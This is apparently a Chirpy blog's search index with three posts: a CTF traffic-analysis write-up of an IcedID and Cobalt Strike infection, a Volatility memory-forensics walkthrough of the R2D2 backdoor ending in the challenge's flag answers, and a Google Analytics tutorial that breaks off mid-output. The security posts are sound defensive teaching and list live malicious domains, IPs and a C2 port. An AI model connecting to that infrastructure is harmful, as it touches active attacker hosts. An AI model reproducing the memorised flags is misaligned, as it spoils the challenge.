[
  
  {
    "title": "2022-03-21 - TRAFFIC ANALYSIS EXERCISE - BURNINCANDLE",
    "url": "/posts/MalwareTraffic-1/",
    "categories": "CTF-TIME",
    "tags": "Cobalt Strike, wireshark, kerberos, NetworkMiner, IcedID, samr, MS-SAMR, Quantum Ransomware",
    "date": "2022-11-15 00:00:00 +0800",
    





    
    "snippet": "2022-03-21 - TRAFFIC ANALYSIS EXERCISE - BURNINCANDLESCENARIOExercise LinkZip archive of the pcap: 2022-03-21-traffic-analysis-exercise.pcap.zip 4.9 MB (4,942,730 bytes)LAN segment data:  LAN segme...",
    "content": "2022-03-21 - TRAFFIC ANALYSIS EXERCISE - BURNINCANDLESCENARIOExercise LinkZip archive of the pcap: 2022-03-21-traffic-analysis-exercise.pcap.zip 4.9 MB (4,942,730 bytes)LAN segment data:  LAN segment range: 10.0.19.0/24 (10.0.19.0 through 10.0.19.255)  Domain: burnincandle.com  Domain controller: 10.0.19.9 - BURNINCANDLE-DC  LAN segment gateway: 10.0.19.1  LAN segment broadcast address: 10.0.19.255TASK  Write an incident report based on the pcap.  The incident report should contains 3 sections:          Executive Summary: State in simple, direct terms what happened (when, who, what).      Details: Details of the victim (hostname, IP address, MAC address, Windows user account name).      Indicators of Compromise (IOCs): IP addresses, domains and URLs associated with the infection. SHA256 hashes if any malware binaries can be extracted from the pcap.      üß† Thought Process üß†We have been provided details regarding the clients LAN segment to investigate what transpired. So far we have the Domain info, DC, Gateway and Broadcast IP addresses. A quick way to find other hosts on the network would be too look at the endpoint summary. ( Statistics &gt; Endpoints)We get 10.0.19.14 , and judging by the number of packets, this could be the target we‚Äôre interested in. Lets find more info about the host. Using dhcp as my display filter, and inspecting the DHCP Request frame in the packet details pane, we get information that we need. i.e,  Client MAC address: PERIPHER_b7:33:0f (00:60:52:b7:33:0f)  Requested IP Address: 10.0.19.14  Host Name: DESKTOP-5QS3D5D  Client name: DESKTOP-5QS3D5D.burnincandle.comWe also need to find the User account name of this host. Since the IP is co-joined to a domain (burnincandle.com), we can confirm if we have some kerberos related packets by looking at the protocol hiererachy statistics.( Statistics &gt; Protocol Hiererachy)  Kerberos is a protocol for authenticating service requests between trusted hosts across an untrusted network, such as the internet.Yeeep, we do. With this in mind, since we know the DC ip, we can throw in a filter like ip.addr == 10.0.19.14 &amp;&amp; ip.addr == 10.0.19.9 &amp;&amp; kerberos.CNameString and !(kerberos.CNameString contains $) to only display packets containing the CNameString field.  cname: this section holds the username the client is trying to authenticate. To be more specific, the exact username in this case is ‚Äúpatrick.zimmerman‚Äù  Please note that the CNameString Column isnt there by default. I added it manually as shown:Also, another quick way to find such information, you can use NetworkMiner , an open source Network Forensic Analysis Tool (NFAT).IOC‚ÄôsWe can then start looking for any IOCs and try figure out what happened. Looking at HTTP related traffic, we see the victim machine made contact with a suspicious host : oceriesfornot.top on dst IP : 188.166.154.118I did a lookup on the two hosts : x1.c.lencr.org &amp; ctldl.windowsupdate.com and they seem to legitimately belong to LetsEncrypt &amp; Microsoft respectively. However, oceriesfornot.top looks like its affliated to the Quantum RansomwareSelecting the frame and following TCP stream, we get an interesting cookie :Spent sometime researching more on the same and got a hit on sysopfb‚Äôs blog where he does some RE on IcedID malware that contained a similar cookie.He explains that the _u cookie value holds the victims username and computername hexlified. So i used cyberchef to confirm this and indeed we get: DESKTOP-5QS3D5D:patrick.zimmerman:CD2F3B9F67E3C343Other values have been summarized in the table below:            Cookie      Value                  _gid      Based on physical address of NIC              _io      Domain identifier from SID              _u      Username and Computername              _gat      Windows version info              _ga      Processor info via CPUID including hypervisor brand if available              _gads      First DWORD from decoded config data, flag from inspecting server certificate, a random DWORD or number passed as parameter with -id=, number of processes      Something else we notice here is the victim seems to be getting a gzip file from the suspicious IP. I used NetworkMiner to extract it.However, VT didnt pick this up as malicious.I tried to do some manual analysis on the file and see what i could find but i guess i hit the wall üò©. Back to research , i found out that IcedID uses this technique as the first stage loading mechanism. The Binary Defense Threat Hunting team have a nice technical blog on the IcedID GZIPLOADER . i‚Äôd suggest having a look at it.üòâSimply put, IcedID‚Äôs gziploader infection chain looks like this:~Source: Binary Defense BlogI then proceeded to my third tool, Brim Security to query the packets further. In this case i‚Äôm interested in seeing DNS queries with the most counts or suspicious names.Cleaning this up abit we get the queries and responses.Now back to wireshark and filtering for dns.a we get 3 other unique query responses, 2 happening in a span of a second. Whats also unique is that both are file sharing websites.Applying 23.227.198.203 (bupdater.com) as my destination address, i noticed a pattern. Every minute the host seems to beacon/communicate with bupdater[.]com on port 757. C2 traffic? Potential exfiltration? C2 heartbeat activity? Lets find out.Doing a lookup on VirusTotal , i found several other people having reported it as a Cobalt Strike C2 Server.Enumeration.Net (net.exe) commands are often used by attackers and insiders to enumerate target network information, change passwords, and create users. Monitoring for MS-SAMR related activities, allows us to detect and respond to this behavior that is often an important part of attacks such as ransomware.  MS-SAMR (Security Account Manager (SAM) Remote Protocol) supports management functionality for an account store or directory containing users and groups. The goal of the protocol is to enable IT administrators and users to manage users, groups, and computers.On wireshark, we can filter for this protocol by using samr as our display filter. But for learning purposes, lets first understand the basic flow of the SAMR protocol. (See screenshot below)            Shortly after our victim is done communicating with 157.245.142.66 , we can see SMB connections from the victim to the DC.                  The second phase is to connect to the IPC$ share on the remote machine. The IPC$ share as you might already know, is used for Inter Proces Communication by using RPC over SMB to allow clients to send different commands to the server to listen users, shares, etc.                  The third phase is to open the SAMR named pipe.                  Fourth phase is to connect to the SAMR interface, which can be recognized by its UUID: 12345778-1234-abcd-ef00-0123456789ac as shown below.      Just to make things cleaner moving on, i applied the samr filter to get commands and queries executed. The first two packets, Connect5 request &amp; Connect5 response tends to obtains a handle to a server object. What follows next is abit interesting though.The attacker seems to be enumerating the Domain, Groups, RIDS etc. Here is a summary of all methods i extracted at the end of my analysis:  EnumDomains - is used to obtain a listing of all domains hosted by the server-side of the protocol.  LookupDomain - uses the established context handle to return the SID of a domain object, given the object‚Äôs name obtained from the EnumerateDomains method.  OpenDomain - obtains a handle to a domain object, using the SID returned by the previous LookupDomain method.  LookupNames - translates a set of account names into a set of RIDs.  OpenGroup - obtains a handle to a domain object, given a SID.  QueryGroupInfo  QueryGroupMember - will query all the members that are part of Domain Admin but will only display the RID.  LookupRids - Shows the account name of each RID that is a member of Domain Admins.  OpenUser - obtains a handle to a user, given a RID.  QueryUserInfo - obtains attributes from a user object using the user object handle  QuerySecurity  GetGroupsForUser - obtains a listing of groups that a user is a member of.  GetAliasMembership - obtains the union of all aliases that a given set of SIDs is a member of.Sample information gathered about the target and target domain:Summary of IOC‚Äôs collected:Domains and IP addresses for IcedID (Bokbot):            Domain      IP                  oceriesfornot[.]top      188.166.154.118              antnosience[.]com      157.245.142.66              suncoastpinball[.]com      160.153.32.99              otectagain[.]top      157.245.142.66              seaskysafe[.]com      91.193.16.181              dilimoretast[.]com      160.153.32.99      Suspicious traffic to file sharing domains:            Domain      IP                  filebin[.]net      185.47.40.36              situla[.]bitbit[.]net      87.238.33.8 , 87.238.33.7      Domains and IP addresses for Cobalt Strike:            Domain      IP      Port                  bupdater[.]com      23.227.198.203      757      ConclusionI had so much fun analyzing this PCAP, and learnt much on the fly. I would definately recommend checking out Brad Duncan‚Äôs Blog. It‚Äôs really a great resource for packet capture (pcap) files and malware samples. While you are at it, consider giving him a follow on twitter @malware_traffic for any updates.If anyone has additional details that i might have missed, or has any feedback to improve my methodology it would be greatly appreciated.Resources  Wireshark Tutorial: Identifying Hosts and Users  Taming Kerberos and making it our loyal companion  IcedID PhotoLoader evolution  IcedID GZIPLOADER Analysis  MS-SAMR: Security Account Manager (SAM) Remote Protocol (Client-to-Server) doumentation  Detecting Security Events Using the MS-SAMR Protocol  Analyzing network packets with Wireshark ‚Äì AD and User Enumeration"
  },
  
  {
    "title": "R2D2 Backdoor - Memory Forensics",
    "url": "/posts/CyberConFinals/",
    "categories": "CTF-TIME",
    "tags": "volatility, r2d2 backdoor",
    "date": "2022-11-15 00:00:00 +0800",
    





    
    "snippet": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional tea...",
    "content": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional teams and 10 University teams battled out different challenges ranging from: Web, Forensics, Pwn, Reverse Engineering. Anyway, i didn‚Äôt have enough time to properly setup a challenge from scratch, so i resolved to create some questions on a memory sample containing some nasty backdoor i was analyzing sometime back. I was happy to see folks solve most of the challenges and almost comming to the same conclusion i had before. With that said, i will be sharing my thought process on how the challenges were meant to be solved.So, what is a memory dump? Simply put, a memory dump (also known as a core dump or system dump) is a snapshot capture of computer memory data from a specific instant. A memory dump can contain valuable forensics data about the state of the system before an incident such as a crash or security compromise.  Memory forensics can provide unique insights into runtime system activity, including open network connections and recently executed commands or processes. In many cases, critical data pertaining to attacks or threats will exist solely in system memory ‚Äì examples include network connections, account credentials, chat messages, encryption keys, running processes, injected code fragments, and internet history which is non-cacheable. Any program ‚Äì malicious or otherwise ‚Äì must be loaded in memory in order to execute, making memory forensics critical for identifying otherwise obfuscated attacks. ~Source: DigitalGuardianFirst, you unzip the provided memory sample. Password: infectedTo answer the first question, you were only required to get the md5sum of the .vmem file. This was as easy as:‚ûú  md5sum malware.vmemcb47af710c7ab59e43d1396aa7ce950c  malware.vmemMoving on, we can use a tool like volatility to analyze the memory dump.Other tools you can explore on memory forensics include:  Rekall Framework  RedlineFirst, you need to find more information about the dump you are analying such as the image profile to use. To do so, you can use the imageinfo plugin or kdbgscan.‚ûú  python2 vol.py -f malware.vmem imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/CyberCON/malware.vmem)                      PAE type : PAE                           DTB : 0x319000L                          KDBG : 0x80544ce0L          Number of Processors : 1     Image Type (Service Pack) : 2                KPCR for CPU 0 : 0xffdff000L             KUSER_SHARED_DATA : 0xffdf0000L           Image date and time : 2011-10-10 17:06:54 UTC+0000     Image local date and time : 2011-10-10 13:06:54 -0400With that determined, you can begin investigating the processes running on the target system by using the pslist plugin.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pslistVolatility Foundation Volatility Framework 2.6.1Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0x819cc830 System                    4      0     55      162 ------      00x81945020 smss.exe                536      4      3       21 ------      0 2011-10-10 17:03:56 UTC+00000x816c6020 csrss.exe               608    536     11      355      0      0 2011-10-10 17:03:58 UTC+00000x813a9020 winlogon.exe            632    536     24      533      0      0 2011-10-10 17:03:58 UTC+00000x816da020 services.exe            676    632     16      261      0      0 2011-10-10 17:03:58 UTC+00000x813c4020 lsass.exe               688    632     23      336      0      0 2011-10-10 17:03:58 UTC+00000x81772ca8 vmacthlp.exe            832    676      1       24      0      0 2011-10-10 17:03:59 UTC+00000x8167e9d0 svchost.exe             848    676     20      194      0      0 2011-10-10 17:03:59 UTC+00000x817757f0 svchost.exe             916    676      9      217      0      0 2011-10-10 17:03:59 UTC+00000x816c6da0 svchost.exe             964    676     63     1058      0      0 2011-10-10 17:03:59 UTC+00000x815daca8 svchost.exe            1020    676      5       58      0      0 2011-10-10 17:03:59 UTC+00000x813aeda0 svchost.exe            1148    676     12      187      0      0 2011-10-10 17:04:00 UTC+00000x817937e0 spoolsv.exe            1260    676     13      140      0      0 2011-10-10 17:04:00 UTC+00000x81754990 VMwareService.e        1444    676      3      145      0      0 2011-10-10 17:04:00 UTC+00000x8136c5a0 alg.exe                1616    676      7       99      0      0 2011-10-10 17:04:01 UTC+00000x815c4da0 wscntfy.exe            1920    964      1       27      0      0 2011-10-10 17:04:39 UTC+00000x813bcda0 explorer.exe           1956   1884     18      322      0      0 2011-10-10 17:04:39 UTC+00000x816d63d0 VMwareTray.exe          184   1956      1       28      0      0 2011-10-10 17:04:41 UTC+00000x8180b478 VMwareUser.exe          192   1956      6       83      0      0 2011-10-10 17:04:41 UTC+00000x818233c8 reader_sl.exe           228   1956      2       26      0      0 2011-10-10 17:04:41 UTC+00000x815e7be0 wuauclt.exe             400    964      8      173      0      0 2011-10-10 17:04:46 UTC+00000x817a34b0 cmd.exe                 544   1956      1       30      0      0 2011-10-10 17:06:42 UTC+0000No process looks suspicious at this point. We can take this a notch higher and use the pstree plugin to print process list as a tree. This would make you understand which process triggered other processes.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.6.1Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x819cc830:System                                      4      0     55    162 1970-01-01 00:00:00 UTC+0000. 0x81945020:smss.exe                                 536      4      3     21 2011-10-10 17:03:56 UTC+0000.. 0x816c6020:csrss.exe                               608    536     11    355 2011-10-10 17:03:58 UTC+0000.. 0x813a9020:winlogon.exe                            632    536     24    533 2011-10-10 17:03:58 UTC+0000... 0x816da020:services.exe                           676    632     16    261 2011-10-10 17:03:58 UTC+0000.... 0x817757f0:svchost.exe                           916    676      9    217 2011-10-10 17:03:59 UTC+0000.... 0x81772ca8:vmacthlp.exe                          832    676      1     24 2011-10-10 17:03:59 UTC+0000.... 0x816c6da0:svchost.exe                           964    676     63   1058 2011-10-10 17:03:59 UTC+0000..... 0x815c4da0:wscntfy.exe                         1920    964      1     27 2011-10-10 17:04:39 UTC+0000..... 0x815e7be0:wuauclt.exe                          400    964      8    173 2011-10-10 17:04:46 UTC+0000.... 0x8167e9d0:svchost.exe                           848    676     20    194 2011-10-10 17:03:59 UTC+0000.... 0x81754990:VMwareService.e                      1444    676      3    145 2011-10-10 17:04:00 UTC+0000.... 0x8136c5a0:alg.exe                              1616    676      7     99 2011-10-10 17:04:01 UTC+0000.... 0x813aeda0:svchost.exe                          1148    676     12    187 2011-10-10 17:04:00 UTC+0000.... 0x817937e0:spoolsv.exe                          1260    676     13    140 2011-10-10 17:04:00 UTC+0000.... 0x815daca8:svchost.exe                          1020    676      5     58 2011-10-10 17:03:59 UTC+0000... 0x813c4020:lsass.exe                              688    632     23    336 2011-10-10 17:03:58 UTC+0000 0x813bcda0:explorer.exe                             1956   1884     18    322 2011-10-10 17:04:39 UTC+0000. 0x8180b478:VMwareUser.exe                           192   1956      6     83 2011-10-10 17:04:41 UTC+0000. 0x817a34b0:cmd.exe                                  544   1956      1     30 2011-10-10 17:06:42 UTC+0000. 0x816d63d0:VMwareTray.exe                           184   1956      1     28 2011-10-10 17:04:41 UTC+0000. 0x818233c8:reader_sl.exe                            228   1956      2     26 2011-10-10 17:04:41 UTC+0000At this point we see explorer.exe (PID: 1956) spawning VMwareUser.exe , cmd.exe ( Suspicious) , VMwareTray.exe &amp; reader_sl.exe ( Suspicious). My thinking, The user probably opened a malicious pdf file that spawned cmd and finally Adobe reader to view it. We can use the cmdscan plugin to extract command history as shown:‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 cmdscanVolatility Foundation Volatility Framework 2.6.1**************************************************CommandProcess: csrss.exe Pid: 608CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 @ 0x4e1eb8: sc query malwarCmd #1 @ 0x11135e8: sc query malwareWe see sc query malware command was executed.  The sc command is used to configure, query, stop, start, delete, and add system services on the Windows command line.In our case, the command seems to be querying a service called malware. The first command entry looks like a typo though.Similar to cmdscan the consoles plugin finds commands that attackers typed into cmd.exe or executed via backdoors. The major advantage to this plugin is it not only prints the commands attackers typed, but it collects the entire screen buffer (input and output). For instance, lets see what output was generated when sc query malware command was executed.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 consolesVolatility Foundation Volatility Framework 2.6.1**************************************************ConsoleProcess: csrss.exe Pid: 608Console: 0x4e2370 CommandHistorySize: 50HistoryBufferCount: 2 HistoryBufferMax: 4OriginalTitle: %SystemRoot%\\system32\\cmd.exeTitle: C:\\WINDOWS\\system32\\cmd.exeAttachedProcess: cmd.exe Pid: 544 Handle: 0x4c4----CommandHistory: 0x1113498 Application: sc.exe Flags:CommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x0----CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 at 0x4e1eb8: sc query malwarCmd #1 at 0x11135e8: sc query malware----Screen 0x4e2a70 X:80 Y:300Dump:Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;sc query malwar[SC] EnumQueryServicesStatus:OpenService FAILED 1060:The specified service does not exist as an installed service.C:\\Documents and Settings\\Administrator&gt;sc query malwareSERVICE_NAME: malware        TYPE               : 1  KERNEL_DRIVER        STATE              : 4  RUNNING                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0C:\\Documents and Settings\\Administrator&gt;More information about the service can be queried using the svcscan plugin. This plugin gives more detail to the running processes in the event that the analyst requires additional details such as the display name, binary path, or service type.We see that the service is running. Next thing we can try establish if there were network connections. Using connscan plugin, we see‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 connscanVolatility Foundation Volatility Framework 2.6.1Offset(P)  Local Address             Remote Address            Pid---------- ------------------------- ------------------------- ---0x01a25a50 0.0.0.0:1026              172.16.98.1:6666          1956We can detect listening sockets for any protocol (TCP, UDP, RAW, etc), using the sockets plugin.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 socketsVolatility Foundation Volatility Framework 2.6.1Offset(V)       PID   Port  Proto Protocol        Address         Create Time---------- -------- ------ ------ --------------- --------------- -----------0x8177e3c0     1956   1026      6 TCP             0.0.0.0         2011-10-10 17:04:39 UTC+00000x81596a78      688    500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x8166a008      964   1029     17 UDP             127.0.0.1       2011-10-10 17:04:42 UTC+00000x818ddc08        4    445      6 TCP             0.0.0.0         2011-10-10 17:03:55 UTC+00000x818328d8      916    135      6 TCP             0.0.0.0         2011-10-10 17:03:59 UTC+00000x81687e98     1616   1025      6 TCP             127.0.0.1       2011-10-10 17:04:01 UTC+00000x817517e8      964    123     17 UDP             127.0.0.1       2011-10-10 17:04:00 UTC+00000x81753b20      688      0    255 Reserved        0.0.0.0         2011-10-10 17:04:00 UTC+00000x8174fe98     1148   1900     17 UDP             127.0.0.1       2011-10-10 17:04:41 UTC+00000x81753008      688   4500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x816118d8        4    445     17 UDP             0.0.0.0         2011-10-10 17:03:55 UTC+0000Moving on, there was a question asking about the computer name and OS version. This information can be found using the envars plugin. Typically this will show the number of CPUs installed and the hardware architecture (though the kdbgscan output is a much more reliable source), the process‚Äôs current directory, temporary directory, session name, computer name, user name, and various other interesting artifacts.But what really triggered PID 1956? My hypothesis was that the user opened suspicious PDF documents that led to cmd &amp; Adobe reader spawning. We also saw a network connection linked to this process. Using the iehistory plugin we can recover fragments of IE history index.dat cache files. It can find basic accessed links (via FTP or HTTP), redirected links (‚ÄìREDR), and deleted entries (‚ÄìLEAK). It applies to any process which loads and uses the wininet.dll library, not just Internet Explorer. Typically that includes Windows Explorer and even malware samples. For more info about the same, you can read this blog postFrom the above, we see two suspicious pdf documents linked to the same process: listener.pdf &amp; Exploit.pdfLets scan for malicious drivers loaded, and moreso any that contains the malware string or name.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 driverscan | grep \"malware\"Volatility Foundation Volatility Framework 2.6.1Offset(P)          #Ptr #Hnd Start                            Size Service Key          Name         Driver Name------------------ ---- ---- ------------------ ------------------ -------------------- ------------ -----------0x0000000001a498b8        3        0 0xf9eb4000     0x1500 malware              malware      \\Driver\\malwareTo extract a kernel driver to a file, use the moddump pluggin. Supply the output directory with -D or ‚Äìdump-dir=DIR.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0xf9eb4000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x0f9eb4000 winsys32.sys         OK: driver.f9eb4000.sysWe can get its md5sum and check if its flagged by VT‚ûú  md5sum driver.f9eb4000.sys63270d2354695cabde0baeb0aed60e2a  driver.f9eb4000.sysFrom the VT - driver.f9eb4000.sys Analysis, we find 53/71 vendors flagged this file as malicious. We also learn that it linked with R2D2 backdoor.Running strings on the malicious driver, we find another interesting dll referenced. Doing a quick google search on the same, we still get hits on R2D2 backdoor.Lets find out if the dll is used by explorer.exe. To display a process‚Äôs loaded DLLs, use the dlllist plugin with the -p or --pid filter as shown below.From the output shown above, we see mfc42ul.dll has a wierd base address compared to the rest (0x10000000). What we can do is extract the DLL from the process‚Äôs memory space and dump it to disk for analysis as shown below:‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0x10000000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x010000000 UNKNOWN              OK: driver.10000000.sys‚ûú  md5sum driver.10000000.sys4986f678160ccd516f2bd589719ea0c4  driver.10000000.sysDoing a quick check on VirusTotal, we see 46/68 flagged this file as malicious.I did some research on this backdoor and came across this report by the Chaos Computer Club (CCC), a long-established German hacker group that claimed that the German government may have unleashed a backdoor Trojan Horse program, allowing them to spy on its people. While running strings on the suspicious dll (mfc42ul.dll), i noticed some wierd string, C3PO-r2d2-POE. Starwars characters? I don‚Äôt know.From CCC‚Äôs report, i learnt that the backdoor was dubbed ‚ÄúR2D2‚Äù due to the ‚ÄúC3PO-r2d2-POE‚Äù string located inside the Trojan. CCC claims that it allows the monitoring Internet activity, including the recording of MSN Messenger conversations, Skype calls and Yahoo messenger chat.That wraps up my analysis of the R2D2 backdoor, atleast for the context of the CTF. Upon completion of my analysis, I stumbled upon several blog posts documenting analysis of the same sample. Please check them out!  Invoke-IR - R2D2 Memory Sample Analysis   ka1d0 - Analyzing Memory Dumps ‚Äî R2D2 Malware  Skills that matter - Hunting R2D2 Malware  evild3ad - Federal Trojan aka R2D2If anyone has additional details that i might have missed, or has any feedback to improve my methodology it would be greatly appreciated.Questions  What is the md5sum of the memory sample (50pts)ccke{cb47af710c7ab59e43d1396aa7ce950c}  What is the computer name of the machine captured (50pts)ccke{GENERALLEE}  What is the name of the OS from which the memory sample was captured from? (50pts)ccke{Windows_NT}  What process triggered a series of suspicious processes? (50pts)ccke{1956}  What Remote Address and Port was the victim machine communicating with? (50pts)ccke{172.16.98.1:6666}  There are two suspicious PDFs that were likely opened. Can you find their names? (50pts)ccke{listener.pdf,Exploit.pdf}  What is the md5sum of the malicious dll? (300pts)ccke{4986f678160ccd516f2bd589719ea0c4}  What is the md5sum of the malicious driver? (300pts)ccke{63270d2354695cabde0baeb0aed60e2a}  What is the name of this backdoor? (100pts)ccke{R2D2} or ccke{r2d2}"
  },
  
  {
    "title": "Enable Google Page Views",
    "url": "/posts/enable-google-pv/",
    "categories": "Blogging, Tutorial",
    "tags": "google analytics, pageviews",
    "date": "2021-01-04 07:32:00 +0800",
    





    
    "snippet": "  The content of this post applies only to Universal Analytics property (UA), not Google Analytics 4 (GA 4). In addition, since UA is about to be deprecated on Jul 1, 2023, the Page Views feature o...",
    "content": "  The content of this post applies only to Universal Analytics property (UA), not Google Analytics 4 (GA 4). In addition, since UA is about to be deprecated on Jul 1, 2023, the Page Views feature of Chirpy will also be deprecated at that time.This post is to enable Page Views on the Chirpy theme based blog that you just built. This requires technical knowledge and it‚Äôs recommended to keep the google_analytics.pv.* empty unless you have a good reason. If your website has low traffic, the page views count would discourage you to write more blogs. With that said, let‚Äôs start with the setup.Set up Google AnalyticsCreate GA account and propertyFirst, you need to set up your account on Google analytics. While you create your account, you must create your first Property as well.  Head to https://analytics.google.com/ and click on Start Measuring  Enter your desired Account Name and choose the desired checkboxes  Enter your desired Property Name. This is the name of the tracker project that appears on your Google Analytics dashboard  Enter the required information About your business  Hit Create and accept any license popup to set up your Google Analytics account and create your propertyCreate Data StreamWith your property created, you now need to set up Data Stream to track your blog traffic. After you signup, the prompt should automatically take you to create your first Data Stream. If not, follow these steps:  Go to Admin on the left column  Select the desired property from the drop-down on the second column  Click on Data Streams  Add a stream and click on Web  Enter your blog‚Äôs URLIt should look like this:Now, click on the new data stream and grab the Measurement ID. It should look something like G-V6XXXXXXXX. Copy this to your _config.yml file:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  # Google Analytics pageviews report settings  pv:    proxy_endpoint:   # fill in the Google Analytics superProxy endpoint of Google App Engine    cache_path:       # the local PV cache data, friendly to visitors from GFW regionWhen you push these changes to your blog, you should start seeing the traffic on your Google Analytics. Play around with the Google Analytics dashboard to get familiar with the options available as it takes like 5 mins to pick up your changes. You should now be able to monitor your traffic in real time.Setup Page ViewsThere is a detailed tutorial available to set up Google Analytics superProxy. But, if you are interested to just quickly get your Chirpy-based blog display page views, follow along. These steps were tested on a Linux machine. If you are running Windows, you can use the Git bash terminal to run Unix-like commands.Setup Google App Engine      Visit https://console.cloud.google.com/appengine        Click on Create Application        Click on Create Project        Enter the name and choose the data center close to you        Select Python language and Standard environment        Enable billing account. Yeah, you have to link your credit card. But, you won‚Äôt be billed unless you exceed your free quota. For a simple blog, the free quota is more than sufficient.        Go to your App Engine dashboard on your browser and select API &amp; Services from the left navigation menu        Click on Enable APIs and Services button on the top        Enable the following APIs: Google Analytics API        On the left, Click on OAuth Consent Screen and accept Configure Consent Screen. Select External since your blog is probably hosted for the public. Click on Publish under Publishing Status        Click on Credentials on the left and create a new OAuth Client IDs credential. Make sure to add an entry under Authorized redirect URIs that matches: https://&lt;project-id&gt;.&lt;region&gt;.r.appspot.com/admin/auth        Note down the Your Client ID and Your Client Secret. You‚Äôll need this in the next section.        Download and install the cloud SDK for your platform: https://cloud.google.com/sdk/docs/quickstart        Run the following commands:    [root@bc96abf71ef8 /]# gcloud init~snip~Go to the following link in your browser:    https://accounts.google.com/o/oauth2/auth?response_type=code&amp;client_id=XYZ.apps.googleusercontent.com&amp;redirect_uri=ABCDEFGEnter verification code: &lt;VERIFICATION CODE THAT YOU GET AFTER YOU VISIT AND AUTHENTICATE FROM THE ABOVE LINK&gt;You are logged in as: [blah_blah@gmail.com].Pick cloud project to use:[1] chirpy-test-300716[2] Create a new projectPlease enter numeric choice or text value (must exactly match listitem): 1[root@bc96abf71ef8 /]# gcloud info# Your selected project info should be displayed here      Setup Google Analytics superProxy      Clone the Google Analytics superProxy project on Github: https://github.com/googleanalytics/google-analytics-super-proxy to your local.        Remove the first 2 lines in the src/app.yaml file:    - application: your-project-id- version: 1            In src/config.py, add the OAUTH_CLIENT_ID and OAUTH_CLIENT_SECRET that you gathered from your App Engine Dashboard.        Enter any random key for XSRF_KEY, your config.py should look similar to this    #!/usr/bin/python2.7__author__ = 'pete.frisella@gmail.com (Pete Frisella)'# OAuth 2.0 Client SettingsAUTH_CONFIG = {  'OAUTH_CLIENT_ID': 'YOUR_CLIENT_ID',  'OAUTH_CLIENT_SECRET': 'YOUR_CLIENT_SECRET',  'OAUTH_REDIRECT_URI': '%s%s' % (    'https://chirpy-test-XXXXXX.ue.r.appspot.com',    '/admin/auth'  )}# XSRF SettingsXSRF_KEY = 'OnceUponATimeThereLivedALegend'              You can configure a custom domain instead of https://PROJECT_ID.REGION_ID.r.appspot.com.But, for the sake of keeping it simple, we will be using the Google provided default URL.            From inside the src/ directory, deploy the app    [root@bc96abf71ef8 src]# gcloud app deployServices to deploy:descriptor:      [/tmp/google-analytics-super-proxy/src/app.yaml]source:          [/tmp/google-analytics-super-proxy/src]target project:  [chirpy-test-XXXX]target service:  [default]target version:  [VESRION_NUM]target url:      [https://chirpy-test-XXXX.ue.r.appspot.com]Do you want to continue (Y/n)? YBeginning deployment of service [default]...‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó‚ï†‚ïê Uploading 1 file to Google Cloud Storage                 